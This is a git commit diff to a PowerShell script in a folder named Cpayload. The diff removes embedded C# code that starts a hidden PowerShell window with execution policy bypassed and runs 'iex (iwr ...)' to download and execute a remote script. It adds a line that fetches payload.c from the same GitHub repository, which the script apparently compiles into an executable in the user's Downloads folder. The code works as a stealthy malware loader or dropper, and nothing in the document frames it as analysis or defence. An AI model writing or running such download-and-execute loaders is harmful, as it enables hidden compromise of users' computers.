4447847cc96a3f0f3a86c056f1d0d473bd3b09d2
43a1723 <hai1723notgay@gmail.com>
2024-09-02 15:37:43 +0700

    Update main.ps1

--- Extras/Cpayload/main.ps1
+++ Extras/Cpayload/main.ps1
@@ -1,41 +1,4 @@
-$source  = @" 
-using System;
-using System.Diagnostics;
-
-namespace PowerShellExecution
-{
-    class Program
-    {
-        static void Main()
-        {
-            string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
-            string psCommand = $"iex (iwr {url} -UseBasicP)";
-
-            ProcessStartInfo startInfo = new ProcessStartInfo
-            {
-                FileName = "powershell.exe",
-                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true
-            };
-
-            using (Process process = Process.Start(startInfo))
-            {
-                // Output and error streams can be captured if needed
-                string output = process.StandardOutput.ReadToEnd();
-                string error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
-
-                // Optionally, you can log or process the output and error
-                // Console.WriteLine(output); // Uncomment to see the output
-                // Console.WriteLine(error);  // Uncomment to see any errors
-            }
-        }
-    }
-}
-"@
+$source  = iwr https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/payload.c
 $outpath  =  "$env:userprofile\downloads\hello.exe" 
 $dict = new-object 'System.Collections.Generic.Dictionary[string,string]' 
 $dict.Add('CompilerVersion','v4.0')
